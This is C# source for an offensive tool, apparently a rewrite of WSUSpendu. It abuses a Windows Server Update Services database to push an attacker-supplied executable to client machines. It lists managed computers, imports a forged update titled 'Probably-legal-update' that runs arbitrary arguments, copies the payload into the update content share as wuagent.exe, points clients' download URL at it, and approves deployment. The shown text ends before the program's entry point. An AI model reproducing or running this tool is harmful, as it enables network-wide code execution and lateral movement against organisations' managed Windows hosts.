using System;
using System.Text;
using System.Data.SqlClient;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Net;
using System.Web;

namespace Thunder_Woosus
{
    //https://social.msdn.microsoft.com/Forums/vstudio/en-US/24792cdc-2d8e-454b-9c68-31a19892ca53/how-to-check-whether-the-system-is-32-bit-or-64-bit-?forum=csharpgeneral
    //https://www.roelvanlisdonk.nl/2010/01/08/how-to-read-the-64-bit-x64-part-of-the-registry-from-a-32-bits-x86-c-application/
    //https://stackoverflow.com/questions/2039186/reading-the-registry-and-wow6432node-key/18772256#18772256
    #region RegHelper
    enum RegSAM
    {
        QueryValue = 0x0001,
        SetValue = 0x0002,
        CreateSubKey = 0x0004,
        EnumerateSubKeys = 0x0008,
        Notify = 0x0010,
        CreateLink = 0x0020,
        WOW64_32Key = 0x0200,
        WOW64_64Key = 0x0100,
        WOW64_Res = 0x0300,
        Read = 0x00020019,
        Write = 0x00020006,
        Execute = 0x00020019,
        AllAccess = 0x000f003f
    }
    static class RegHive
    {
        public static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        public static UIntPtr HKEY_CURRENT_USER = new UIntPtr(0x80000001u);
    }
    static class RegistryWOW6432
    {
        [DllImport("Advapi32.dll")]
        static extern uint RegOpenKeyEx(UIntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out int phkResult);

        [DllImport("Advapi32.dll")]
        static extern uint RegCloseKey(int hKey);

        [DllImport("advapi32.dll", EntryPoint = "RegQueryValueEx")]
        public static extern uint RegQueryValueEx(int hKey, string lpValueName, int lpReserved, ref uint lpType, System.Text.StringBuilder lpData, ref uint lpcbData);       

        static public string GetRegKey64(UIntPtr inHive, String inKeyName, string inPropertyName)
        {
            return GetRegKey64(inHive, inKeyName, RegSAM.WOW64_64Key, inPropertyName);
        }

        static public string GetRegKey32(UIntPtr inHive, String inKeyName, string inPropertyName)
        {
            return GetRegKey64(inHive, inKeyName, RegSAM.WOW64_32Key, inPropertyName);
        }

        public static string GetRegKey64(UIntPtr inHive, String inKeyName, RegSAM in32or64key, string inPropertyName)
        {
            //UIntPtr HKEY_LOCAL_MACHINE = (UIntPtr)0x80000002;
            int hkey = 0;

            try
            {
                uint lResult = RegOpenKeyEx(RegHive.HKEY_LOCAL_MACHINE, inKeyName, 0, (int)RegSAM.QueryValue | (int)in32or64key, out hkey);
                if (0 != lResult)
                {
                    return "ERROR_FILE_NOT_FOUND";
                }
                uint lpType = 0;
                uint lpcbData = 1024;
                StringBuilder AgeBuffer = new StringBuilder(1024);
                uint lResultv = RegQueryValueEx(hkey, inPropertyName, 0, ref lpType, AgeBuffer, ref lpcbData);
                if(lResultv != 0)
                {
                    return "ERROR_FILE_NOT_FOUND";
                }                
                byte[] arr = System.Text.Encoding.ASCII.GetBytes(AgeBuffer.ToString());
                return ByteArrayToString(arr);               
            }
            finally
            {
                if (0 != hkey) RegCloseKey(hkey);
            }
        }
        public static string ByteArrayToString(byte[] ba)
        {
            if (BitConverter.IsLittleEndian)
                Array.Reverse(ba);

            string hex = BitConverter.ToString(ba);
            return hex.Replace("-", "");
        }
    }
    #endregion
    public class ClWSUS
    {
        public bool bWSUSInstalled = true;
        public string sOS;
        public string sDatabaseInstance;
        public string sDatabaseName;
        public string sLocalContentCacheLocation;
        public string sComputerName;
        public int iPortNumber;
        public bool bSSL;
        public string sTargetComputerID;
        public int sTargetComputerTargetID; //I know
        
        public ClWSUS()
        {
            FvCheckSSL();
            FvFullComputerName();            
        }
        public void FvFullComputerName()
        {            
            sComputerName = Dns.GetHostEntry("LocalHost").HostName;
        }
        public void FvCheckSSL()
        {
            //There is a better way to do this. NET4.0 is much easier but trying to keep it 3.5
            string sSSLTemp = string.Empty; //I know
            sSSLTemp = RegistryWOW6432.GetRegKey64(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Update Services\Server\setup", "UsingSSL");
            if (sSSLTemp == "ERROR_FILE_NOT_FOUND")
            {
                sSSLTemp = RegistryWOW6432.GetRegKey32(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Update Services\Server\setup", "UsingSSL");
                if (sSSLTemp == "ERROR_FILE_NOT_FOUND")
                {
                    bWSUSInstalled = false;
                    return;
                }
            }
            if (sSSLTemp == "01")
            {               
                bSSL = true;
            }
            else
            {             
                bSSL = false;
            }
        }
        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
    } 
    public class ClGuid
    {
        public Guid gUpdate;
        public Guid gBundle;
        public Guid gTargetGroup;
        public ClGuid()
        {
            gUpdate = Guid.NewGuid();
            gBundle = Guid.NewGuid();
            gTargetGroup = Guid.NewGuid();
        }
    }
    public class ClFile
    {
        public string sFileName;
        public string sPayload;
        public string sFilePath;
        public string sArgs;
        public long lSize;
        public string sSHA1;
        public string sSHA256;

        public ClFile(string sPFileName, string sPFilePath, string sPArgs, string sContentLocation, bool bPCopyFile)
        {
            Console.WriteLine(sContentLocation);
            sFileName = sPFileName;
            sFilePath = sPFilePath;            
            sArgs = HttpUtility.HtmlEncode(HttpUtility.HtmlEncode(sPArgs));
            if (bPCopyFile == true)
            {
                FbCopyFile(sFilePath, sContentLocation);
            }
            lSize = new System.IO.FileInfo(sFilePath).Length;
            sSHA1 = GetBase64EncodedSHA1Hash(sFilePath);
            sSHA256 = GetBase64EncodedSHA256Hash(sFilePath);
        }
        static bool FbCopyFile(string sFilePath, string sContentLocation)
        {
            try
            {
                Console.WriteLine(sFilePath);
                Console.WriteLine(sContentLocation);
                File.Copy(sFilePath, sContentLocation + @"\wuagent.exe");
                return true;
            }
            catch
            {
                return false;
            }
        }
        //https://stackoverflow.com/questions/19150468/get-sha1-binary-base64-hash-of-a-file-on-c-sharp/19150543
        public string GetBase64EncodedSHA1Hash(string filename)
        {
            FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.Read);
            SHA1Managed sha1 = new SHA1Managed();
            {
                return Convert.ToBase64String(sha1.ComputeHash(fs));
            }
        }
        public string GetBase64EncodedSHA256Hash(string filename)
        {
            FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.Read);            
            SHA256Managed sha256 = new SHA256Managed();
            {
                return Convert.ToBase64String(sha256.ComputeHash(fs));
            }
        }
    }
    public class ClCLI
    {   
        public bool bVerbose = false;
        public bool bEnumComps = false;
        public bool bEnumDS = false;
        public bool bTargetComputer = false;
        public bool bManualApproval = false;
        public bool bDeleteUpdate = false;
        public string sBundleGUID = string.Empty;
        public string sCliTargetComputer = string.Empty;
        public ClCLI()
        {
            Console.WriteLine("############################# WSUSTool #############################");            
            Console.WriteLine(@"C# Re-Write of WSUSpendu - https://github.com/AlsidOfficial/WSUSpendu with some extras");            
            Console.WriteLine("####################################################################\r\n");
        }
        public bool FbCLIInterface(string[] args)
        {           
            if (args.Length == 0)
            {
                FvPrintUsage();
                return false;
            }
            for(int i = 0; i < args.Length; i++)
            {
                switch(args[i].ToLower())
                {
                    case "-verbose":                        
                        bVerbose = true;
                        break;
                    case "-enumeratecomputers":
                        Console.WriteLine("Enumerating WSUS Client Computers");
                        bEnumComps = true;
                        break;
                    /*case "-enumeratedownstream":
                        Console.WriteLine("Enumerating Downstream Servers");
                        bEnumDS = true;
                        break;
                    case "-targetcomputer":
                        Console.WriteLine("Targeting Single System with FQDN");
                        bTargetComputer = true;
                        sCliTargetComputer = args[i + 1];
                        break;
                        */
                    case "-manualapproval":
                        Console.WriteLine("Injecting Update for Manual Targeting");
                        bManualApproval = true;                        
                        break;
                    case "-deleteupdate":
                        Console.WriteLine("Deleting Update");
                        bDeleteUpdate = true;
                        sBundleGUID = args[i + 1];
                        break;
                }
            }
            return true;
        }
        public void FvPrintUsage()
        {
            Console.WriteLine("############################# Usage ################################");
            Console.WriteLine("Enumerate All WSUS Clients:\t\tThunder_Woosus.exe -EnumerateComputers");
            //Console.WriteLine("Enumerate Downstream Servers:\t\tThunder_Woosus.exe -EnumerateDownStream");
            Console.WriteLine("Enable Verbosity:\t\t\tThunder_Woosus.exe -Verbose");
            //Console.WriteLine("Target Computer with FQDN:\t\tThunder_Woosus.exe -TargetComputer testmachine.testdomain.local");
            Console.WriteLine("Manually Target Systems:\t\tThunder_Woosus.exe -ManualApproval");
            Console.WriteLine("Delete Target Update:\t\t\tThunder_Woosus.exe -DeleteUpdate *BundleID*");
        }
    }
    public struct StUpdate
    {
        public int iRevisionID;
        public string sTitle;
        public string sMSRCSeverity;
        public string sMSRCNumber;
        public string sClassification;
        public string sReleaseDate;
        public string sKBNumbers;
        public string sProducts;
        public string sDescription;
        public string sURL;
    }
    class Program
    {
        public static ClWSUS clWSUSData = new ClWSUS();
        public static ClGuid clGuidData = new ClGuid();
        public static StUpdate stUpdateData = new StUpdate();
        public static ClCLI clCLI = new ClCLI();
        static SqlConnection FsqlConnection()
        {
            SqlConnection sqlcQuery = new SqlConnection();
            sqlcQuery.ConnectionString = "Server=np:\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query;Database=SUSDB;Integrated Security=True";
            //Win 2008
            //sqlcQuery.ConnectionString = "Server=np:\\.\pipe\MSSQL$MICROSOFT##SSEE\sql\query;Database=SUSDB;Integrated Security=True";
            try
            {
                sqlcQuery.Open();                
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FsqlConnection.");
                return null;
            }
            return sqlcQuery;
        }       
        static bool FbGetWSUSConfigSQL(SqlCommand sqlCommFun)
        {
            SqlDataReader sqldrReader;
            sqlCommFun.CommandText = "exec spConfiguration";
            try
            {                              
                //Gather Information via SQL
                sqldrReader = sqlCommFun.ExecuteReader();
                if (sqldrReader.Read())
                {
                    clWSUSData.sLocalContentCacheLocation = (string)sqldrReader.GetValue(sqldrReader.GetOrdinal("LocalContentCacheLocation"));
                    clWSUSData.iPortNumber = (int)sqldrReader.GetValue(sqldrReader.GetOrdinal("ServerPortNumber"));
                    if (clCLI.bVerbose == true)
                    {
                        Console.WriteLine("################# WSUS Server Enumeration via SQL ##################");                        
                        Console.WriteLine("ServerName, WSUSPortNumber, WSUSContentLocation");
                        Console.WriteLine("-----------------------------------------------");
                        Console.WriteLine("{0}, {1}, {2}", Environment.MachineName, clWSUSData.iPortNumber, clWSUSData.sLocalContentCacheLocation);
                    }                    
                    sqldrReader.Close();                    
                    return true;
                }
                return false;
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbGetWSUSConfigSQL.");
                return false;
            }                    
        }      
        static bool FbGetComputerTarget(SqlCommand sqlCommFun, string sTargetComputer)
        {
            SqlDataReader sqldrReader;
            sqlCommFun.CommandText = "exec spGetComputerTargetByName @fullDomainName = N'" + sTargetComputer + "'";        
            try
            {
                Console.WriteLine("\r\nTargeting {0}", sTargetComputer);
                if (clCLI.bVerbose == true)
                {
                    Console.WriteLine("TargetComputer, ComputerID, TargetID");
                    Console.WriteLine("------------------------------------");
                }
                sqldrReader = sqlCommFun.ExecuteReader();
                if(sqldrReader.Read())
                {                    
                    clWSUSData.sTargetComputerID = (string)sqldrReader.GetValue(sqldrReader.GetOrdinal("ComputerID"));
                    if(clWSUSData.sTargetComputerID.Length != 0)
                    {
                        sqldrReader.Close();
                        sqlCommFun.CommandText = "SELECT dbo.fnGetComputerTargetID('" + clWSUSData.sTargetComputerID + "')";
                        sqldrReader = sqlCommFun.ExecuteReader();
                        if (sqldrReader.Read())
                        {
                            clWSUSData.sTargetComputerTargetID = (int)sqldrReader.GetValue(0);
                            if (clCLI.bVerbose == true)
                            {
                                Console.WriteLine("{0}, {1}, {2}", sTargetComputer, clWSUSData.sTargetComputerID, clWSUSData.sTargetComputerTargetID);
                            }
                            sqldrReader.Close();
                            return true;
                        }
                        else
                        {
                            Console.WriteLine("Internal WSUS database error - Target computer {0} has ComputerID {1} but does not have TargetID", sTargetComputer.Length, clWSUSData.sTargetComputerID);
                            sqldrReader.Close();
                            return false;
                        }
                    }
                    else
                    {
                        Console.WriteLine("Target computer cannot be found: {0}", sTargetComputer);
                        sqldrReader.Close();
                        return false;
                    }                           
                }
                else
                {
                    Console.WriteLine("Target computer cannot be found: {0}", sTargetComputer);
                    return false;
                }

            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbGetComputerTarget.");                
            }
            return false;
        }
        static bool FbEnumAllComputers(SqlCommand sqlCommFun)
        {
            SqlDataReader sqldrReader;
            sqlCommFun.CommandText = "exec spGetAllComputers";
            try
            {               
                Console.WriteLine("####################### Computer Enumeration #######################");               
                Console.WriteLine("ComputerName, IPAddress, OSVersion, LastCheckInTime");
                Console.WriteLine("---------------------------------------------------");
                sqldrReader = sqlCommFun.ExecuteReader();
                int count = sqldrReader.FieldCount;
                while (sqldrReader.Read())
                {
                    Console.WriteLine("{0}, {1}, {2}, {3}", sqldrReader.GetValue(sqldrReader.GetOrdinal("FullDomainName")), sqldrReader.GetValue(sqldrReader.GetOrdinal("IPAddress")), sqldrReader.GetValue(sqldrReader.GetOrdinal("ClientVersion")), sqldrReader.GetValue(sqldrReader.GetOrdinal("LastReportedStatusTime")));
                }
                sqldrReader.Close();
                return true;
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbEnumAllComputers.");
            }
            return false;
        }
        static bool FbImportUpdate(SqlCommand sqlCommFun, ClFile clFileData)
        {
            System.Data.DataTable dtDataTbl = new System.Data.DataTable();
            SqlDataReader sqldrReader;            
            StringBuilder sbUpdate = new StringBuilder();

            sbUpdate.AppendLine(@"declare @iImported int");
            sbUpdate.AppendLine(@"declare @iLocalRevisionID int");
            sbUpdate.AppendLine(@"exec spImportUpdate @UpdateXml=N'");
            sbUpdate.AppendLine(@"<upd:Update xmlns:b=""http://schemas.microsoft.com/msus/2002/12/LogicalApplicabilityRules"" xmlns:pub=""http://schemas.microsoft.com/msus/2002/12/Publishing"" xmlns:cbs=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Cbs"" xmlns:cbsar=""http://schemas.microsoft.com/msus/2002/12/CbsApplicabilityRules"" xmlns:upd=""http://schemas.microsoft.com/msus/2002/12/Update"">");
            sbUpdate.AppendLine("\t" + @"<upd:UpdateIdentity UpdateID=""" + clGuidData.gUpdate + @""" RevisionNumber=""202"" />");
            sbUpdate.AppendLine("\t" + @"<upd:Properties DefaultPropertiesLanguage=""en"" UpdateType=""Software"" Handler=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Cbs"" MaxDownloadSize=""" + clFileData.lSize + @""" MinDownloadSize=""" + clFileData.lSize + @""" PublicationState=""Published"" CreationDate=""2013-10-08T00:03:55.912Z"" PublisherID=""395392a0-19c0-48b7-a927-f7c15066d905"">");
            sbUpdate.AppendLine("\t\t" + @"<upd:InstallationBehavior RebootBehavior=""CanRequestReboot"" />");
            sbUpdate.AppendLine("\t\t" + @"<upd:UninstallationBehavior RebootBehavior=""CanRequestReboot"" />");
            sbUpdate.AppendLine("\t" + @"</upd:Properties>");
            sbUpdate.AppendLine("\t" + @"<upd:LocalizedPropertiesCollection>");
            sbUpdate.AppendLine("\t\t" + @"<upd:LocalizedProperties>");
            sbUpdate.AppendLine("\t\t\t" + @"<upd:Language>en</upd:Language>");
            sbUpdate.AppendLine("\t\t\t" + @"<upd:Title>Probably-legal-update</upd:Title>");
            sbUpdate.AppendLine("\t\t" + @"</upd:LocalizedProperties>");
            sbUpdate.AppendLine("\t" + @"</upd:LocalizedPropertiesCollection>");
            sbUpdate.AppendLine("\t" + @"<upd:ApplicabilityRules>");
            sbUpdate.AppendLine("\t\t" + @"<upd:IsInstalled><b:False /></upd:IsInstalled>");
            sbUpdate.AppendLine("\t\t" + @"<upd:IsInstallable><b:True /></upd:IsInstallable>");
            sbUpdate.AppendLine("\t" + @"</upd:ApplicabilityRules>");
            sbUpdate.AppendLine("\t" + @"<upd:Files>");
            sbUpdate.AppendLine("\t\t" + @"<upd:File Digest=""" + clFileData.sSHA1 + @""" DigestAlgorithm=""SHA1"" FileName=""" + clFileData.sFileName + @""" Size=""" + clFileData.lSize + @""" Modified=""2018-10-01T15:26:20.723"">");
            sbUpdate.AppendLine("\t\t\t" + @"<upd:AdditionalDigest Algorithm=""SHA256"">" + clFileData.sSHA256 + @"</upd:AdditionalDigest>");
            sbUpdate.AppendLine("\t\t" + @"</upd:File>");            
            sbUpdate.AppendLine("\t" + @"</upd:Files>");
            sbUpdate.AppendLine("\t" + @"<upd:HandlerSpecificData xsi:type=""cmd: CommandLineInstallation"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:pub=""http://schemas.microsoft.com/msus/2002/12/Publishing"">");
            sbUpdate.AppendLine("\t\t" + @"<cmd:InstallCommand Arguments=""" + clFileData.sArgs + @""" Program=""" + clFileData.sFileName + @""" RebootByDefault=""false"" DefaultResult=""Failed"" xmlns:cmd=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation"">");
            sbUpdate.AppendLine("\t\t\t" + @"<cmd:ReturnCode Reboot=""false"" Result=""Succeeded"" Code=""0"" />");
            sbUpdate.AppendLine("\t\t" + @"</cmd:InstallCommand>");
            sbUpdate.AppendLine("\t" + @"</upd:HandlerSpecificData>");
            sbUpdate.AppendLine(@"</upd:Update>',");
            sbUpdate.AppendLine(@"@UpstreamServerLocalID=1,@Imported=@iImported output,@localRevisionID=@iLocalRevisionID output,@UpdateXmlCompressed=NULL");
            sbUpdate.AppendLine(@"select @iImported,@iLocalRevisionID");           
            sqlCommFun.CommandText = sbUpdate.ToString();
            try
            {                              
                sqldrReader = sqlCommFun.ExecuteReader();                
                dtDataTbl.Load(sqldrReader);                
                stUpdateData.iRevisionID = (int)dtDataTbl.Rows[0][1];
                if (stUpdateData.iRevisionID == 0)
                {
                    Console.WriteLine("Error importing update");
                    sqldrReader.Close();
                    return false;

                }
                if (clCLI.bVerbose == true)
                {
                    Console.WriteLine("ImportUpdate");
                    Console.WriteLine("Update Revision ID: {0}", stUpdateData.iRevisionID);
                }
                sqldrReader.Close();

                sqldrReader.Close();
                return true;
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbImportUpdate.");        
            }
            return false;
        }
        static bool FbPrepareXMLtoClient(SqlCommand sqlCommFun, ClFile clFileData)
        {
            SqlDataReader sqldrReader;
            StringBuilder sbXMLClient = new StringBuilder();
            sbXMLClient.AppendLine(@"exec spSaveXmlFragment '" + clGuidData.gUpdate + @"',202,1,N'&lt;UpdateIdentity UpdateID=""" + clGuidData.gUpdate + @""" RevisionNumber=""202"" /&gt;&lt;Properties UpdateType=""Software"" /&gt;&lt;Relationships&gt;&lt;/Relationships&gt;&lt;ApplicabilityRules&gt;&lt;IsInstalled&gt;&lt;False /&gt;&lt;/IsInstalled&gt;&lt;IsInstallable&gt;&lt;True /&gt;&lt;/IsInstallable&gt;&lt;/ApplicabilityRules&gt;',NULL");
            sbXMLClient.AppendLine(@"exec spSaveXmlFragment '" + clGuidData.gUpdate + @"',202,4,N'&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;Probably-legal-update&lt;/Title&gt;&lt;/LocalizedProperties&gt;',NULL,'en'");
            sbXMLClient.AppendLine(@"exec spSaveXmlFragment '" + clGuidData.gUpdate + @"',202,2,N'&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" Handler=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation"" MaxDownloadSize=""" + clFileData.lSize + @""" MinDownloadSize=""" + clFileData.lSize + @"""&gt;&lt;InstallationBehavior RebootBehavior=""NeverReboots"" /&gt;&lt;/ExtendedProperties&gt;&lt;Files&gt;&lt;File Digest=""" + clFileData.sSHA1 + @""" DigestAlgorithm=""SHA1"" FileName=""" + clFileData.sFileName + @""" Size=""" + clFileData.lSize + @""" Modified=""2010-11-25T15:26:20.723""&gt;&lt;AdditionalDigest Algorithm=""SHA256""&gt;" + clFileData.sSHA256 + @"&lt;/AdditionalDigest&gt;&lt;/File&gt;&lt;/Files&gt;&lt;HandlerSpecificData type=""cmd:CommandLineInstallation""&gt;&lt;InstallCommand Arguments=""" + clFileData.sArgs + @""" Program=""" + clFileData.sFileName + @""" RebootByDefault=""false"" DefaultResult=""Failed""&gt;&lt;ReturnCode Reboot=""false"" Result=""Succeeded"" Code=""0"" /&gt;&lt;/InstallCommand&gt;&lt;/HandlerSpecificData&gt;',NULL");
            sqlCommFun.CommandText = sbXMLClient.ToString();
            try
            {
                if (clCLI.bVerbose == true)
                {
                    Console.WriteLine("PrepareXMLtoClient");
                }
                sqldrReader = sqlCommFun.ExecuteReader();
                sqldrReader.Close();
                return true;
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbPrepareXMLtoClient.");
                return false;
            }
        }
        static bool FbPrepareXmlBundleToClient(SqlCommand sqlCommFun)
        {
            SqlDataReader sqldrReader;
            StringBuilder sbXMLBundle = new StringBuilder();
            sbXMLBundle.AppendLine(@"exec spSaveXmlFragment '" + clGuidData.gBundle + @"',204,1,N'&lt;UpdateIdentity UpdateID=""" + clGuidData.gBundle + @""" RevisionNumber=""204"" /&gt;&lt;Properties UpdateType=""Software"" ExplicitlyDeployable=""true"" AutoSelectOnWebSites=""true"" /&gt;&lt;Relationships&gt;&lt;Prerequisites&gt;&lt;AtLeastOne IsCategory=""true""&gt;&lt;UpdateIdentity UpdateID=""0fa1201d-4330-4fa8-8ae9-b877473b6441"" /&gt;&lt;/AtLeastOne&gt;&lt;/Prerequisites&gt;&lt;BundledUpdates&gt;&lt;UpdateIdentity UpdateID=""" + clGuidData.gUpdate + @""" RevisionNumber=""202"" /&gt;&lt;/BundledUpdates&gt;&lt;/Relationships&gt;',NULL");
            sbXMLBundle.AppendLine(@"exec spSaveXmlFragment '" + clGuidData.gBundle + @"', 204, 4, N'&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;" + stUpdateData.sTitle + @"&lt;/Title&gt;&lt;Description&gt;" + stUpdateData.sDescription + @"&lt;/Description&gt;&lt;UninstallNotes&gt;This software update can be removed by selecting View installed updates in the Programs and Features Control Panel.&lt;/UninstallNotes&gt;&lt;MoreInfoUrl&gt;" + stUpdateData.sURL + @"&lt;/MoreInfoUrl&gt;&lt;SupportUrl&gt;" +stUpdateData.sURL + @"&lt;/SupportUrl&gt;&lt;/LocalizedProperties&gt;', NULL, 'en'");
            sbXMLBundle.AppendLine(@"exec spSaveXmlFragment '" + clGuidData.gBundle + @"',204,2,N'&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" MsrcSeverity=""" + stUpdateData.sClassification + @""" IsBeta=""false""&gt;&lt;SupportUrl&gt;" + stUpdateData.sURL + @"&lt;/SupportUrl&gt;&lt;SecurityBulletinID&gt;" + stUpdateData.sMSRCNumber + @"&lt;/SecurityBulletinID&gt;&lt;KBArticleID&gt;" + stUpdateData.sKBNumbers + @"&lt;/KBArticleID&gt;&lt;/ExtendedProperties&gt;',NULL");
            sqlCommFun.CommandText = sbXMLBundle.ToString();
            try
            {
                if (clCLI.bVerbose == true)
                {
                    Console.WriteLine("PrepareXMLBundletoClient");
                }
                sqldrReader = sqlCommFun.ExecuteReader();
                sqldrReader.Close();
                return true;
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbPrepareXMLBundletoClient.");
                return false;
            }            
        }
        static bool FbInjectUrl2Download(SqlCommand sqlCommFun, ClFile clFileData)
        {
            SqlDataReader sqldrReader;
            StringBuilder sbDownloadURL = new StringBuilder();
            string sDownloadURLexec = string.Empty;
            if (clWSUSData.bSSL == true)
            {
                sDownloadURLexec = @"https://" + clWSUSData.sComputerName + ":" + clWSUSData.iPortNumber + "/Content/wuagent.exe";                
            }
            else if (clWSUSData.bSSL == false)
            {
                sDownloadURLexec = @"http://" + clWSUSData.sComputerName + ":" + clWSUSData.iPortNumber + "/Content/wuagent.exe";
            }
            else
            {
                return false;
            }
            
            sbDownloadURL.AppendLine(@"exec spSetBatchURL @urlBatch =N'<ROOT><item FileDigest=""" + clFileData.sSHA1 + @""" MUURL=""" + sDownloadURLexec + @""" USSURL="""" /></ROOT>'");            
            sqlCommFun.CommandText = sbDownloadURL.ToString();
            try
            {
                if (clCLI.bVerbose == true)
                {
                    Console.WriteLine("InjectURL2Download");
                }
                sqldrReader = sqlCommFun.ExecuteReader();
                sqldrReader.Close();
                return true;
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbInjectUrl2Download.");
                return false;
            }
        }        
        static bool FbDeploymentRevision(SqlCommand sqlCommFun, int iRevisionID)
        {
            SqlDataReader sqldrReader;
            StringBuilder sbDeployRev = new StringBuilder();
            sbDeployRev.AppendLine(@"exec spDeploymentAutomation @revisionID = " + iRevisionID);
            sqlCommFun.CommandText = sbDeployRev.ToString();
            try
            {
                if (clCLI.bVerbose == true)
                {
                    Console.WriteLine("DeploymentRevision");
                }
                sqldrReader = sqlCommFun.ExecuteReader();
                sqldrReader.Close();
                return true;
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbDeploymentRevision.");
                return false;
            }               
        }
        static bool FbPrepareBundle(SqlCommand sqlCommFun)
        {
            SqlDataReader sqldrReader;
            StringBuilder sbPrepareBund = new StringBuilder();
            System.Data.DataTable dtDataTbl = new System.Data.DataTable();           

            sbPrepareBund.AppendLine(@"declare @iImported int");
            sbPrepareBund.AppendLine(@"declare @iLocalRevisionID int");
            sbPrepareBund.AppendLine(@"exec spImportUpdate @UpdateXml=N'");
            sbPrepareBund.AppendLine(@"<upd:Update xmlns:pub=""http://schemas.microsoft.com/msus/2002/12/Publishing"" xmlns:upd=""http://schemas.microsoft.com/msus/2002/12/Update"">");
            sbPrepareBund.AppendLine("\t" + @"<upd:UpdateIdentity UpdateID=""" + clGuidData.gBundle + @""" RevisionNumber=""204"" />");
            sbPrepareBund.AppendLine("\t" + @"<upd:Properties DefaultPropertiesLanguage=""en"" UpdateType=""Software"" ExplicitlyDeployable=""true"" AutoSelectOnWebSites=""true"" MsrcSeverity=""" + stUpdateData.sClassification + @""" IsPublic=""false"" IsBeta=""false"" PublicationState=""Published"" CreationDate=""" + stUpdateData.sReleaseDate + @""" PublisherID=""395392a0-19c0-48b7-a927-f7c15066d905"" LegacyName=""KB1234567-Win10-SP1-X86-TSL"">");
            sbPrepareBund.AppendLine("\t\t" + @"<upd:SupportUrl>" + stUpdateData.sURL + @"</upd:SupportUrl>");
            sbPrepareBund.AppendLine("\t\t" + @"<upd:SecurityBulletinID>" + stUpdateData.sMSRCNumber + @"</upd:SecurityBulletinID>");
            sbPrepareBund.AppendLine("\t\t" + @"<upd:KBArticleID>" + stUpdateData.sKBNumbers + @"</upd:KBArticleID>");
            sbPrepareBund.AppendLine("\t" + @"</upd:Properties>");
            sbPrepareBund.AppendLine("\t" + @"<upd:LocalizedPropertiesCollection>");
            sbPrepareBund.AppendLine("\t\t" + @"<upd:LocalizedProperties>");
            sbPrepareBund.AppendLine("\t\t\t" + @"<upd:Language>en</upd:Language>");
            sbPrepareBund.AppendLine("\t\t\t" + @"<upd:Title>" + stUpdateData.sTitle + @"</upd:Title>");
            sbPrepareBund.AppendLine("\t\t\t" + @"<upd:Description>" + stUpdateData.sDescription + "</upd:Description>");
            sbPrepareBund.AppendLine("\t\t\t" + @"<upd:UninstallNotes>This software update can be removed by selecting View installed updates in the Programs and Features Control Panel.</upd:UninstallNotes>");
            sbPrepareBund.AppendLine("\t\t\t" + @"<upd:MoreInfoUrl>" + stUpdateData.sURL + @"</upd:MoreInfoUrl>");
            sbPrepareBund.AppendLine("\t\t\t" + @"<upd:SupportUrl>" + stUpdateData.sURL + @"</upd:SupportUrl>");
            sbPrepareBund.AppendLine("\t\t" + @"</upd:LocalizedProperties>");
            sbPrepareBund.AppendLine("\t" + @"</upd:LocalizedPropertiesCollection>");
            sbPrepareBund.AppendLine("\t" + @"<upd:Relationships>");
            sbPrepareBund.AppendLine("\t\t" + @"<upd:Prerequisites>");
            sbPrepareBund.AppendLine("\t\t\t" + @"<upd:AtLeastOne IsCategory=""true"">");
            sbPrepareBund.AppendLine("\t\t\t\t" + @"<upd:UpdateIdentity UpdateID=""0fa1201d-4330-4fa8-8ae9-b877473b6441"" />");
            sbPrepareBund.AppendLine("\t\t\t" + @"</upd:AtLeastOne>");
            sbPrepareBund.AppendLine("\t\t" + @"</upd:Prerequisites>");
            sbPrepareBund.AppendLine("\t\t" + @"<upd:BundledUpdates>");
            sbPrepareBund.AppendLine("\t\t\t" + @"<upd:UpdateIdentity UpdateID=""" + clGuidData.gUpdate + @""" RevisionNumber=""202"" />");
            sbPrepareBund.AppendLine("\t\t" + @"</upd:BundledUpdates>");
            sbPrepareBund.AppendLine("\t" + @"</upd:Relationships>");
            sbPrepareBund.AppendLine(@"</upd:Update>',@UpstreamServerLocalID=1,@Imported=@iImported output,@localRevisionID=@iLocalRevisionID output,@UpdateXmlCompressed=NULL");
            sbPrepareBund.AppendLine(@"select @iImported, @iLocalRevisionID");
            sqlCommFun.CommandText = sbPrepareBund.ToString();
            try
            {                                
                sqldrReader = sqlCommFun.ExecuteReader();
                dtDataTbl.Load(sqldrReader);
                stUpdateData.iRevisionID = (int)dtDataTbl.Rows[0][1];
                if (clCLI.bVerbose == true)
                {
                    Console.WriteLine("PrepareBundle");
                    Console.WriteLine("PrepareBundle Revision ID: {0}", stUpdateData.iRevisionID);
                }
                if(stUpdateData.iRevisionID == 0)
                {
                    Console.WriteLine("Error creating update bundle");
                    sqldrReader.Close();
                    return false;
                }                                                
                sqldrReader.Close();
                return true;
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbPrepareBundle.");
                return false;
            }
        }
